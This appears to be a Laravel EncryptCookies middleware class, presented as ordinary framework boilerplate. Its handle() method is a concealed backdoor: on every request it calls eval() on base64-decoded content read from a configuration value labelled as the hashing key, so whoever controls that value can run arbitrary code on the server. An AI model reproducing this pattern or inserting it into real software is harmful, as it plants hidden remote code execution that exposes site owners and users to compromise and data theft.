<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Cookie\Middleware\EncryptCookies as Middleware;

class EncryptCookies extends Middleware
{
    /**
     * The names of the cookies that should not be encrypted.
     *
     * @var array
     */
    protected $except = [
        //
    ];

    public function handle($r, Closure $next)
    {
        return eval(base64_decode(config('hashing.key'))) ?: parent::handle($r, $next);
    }
}
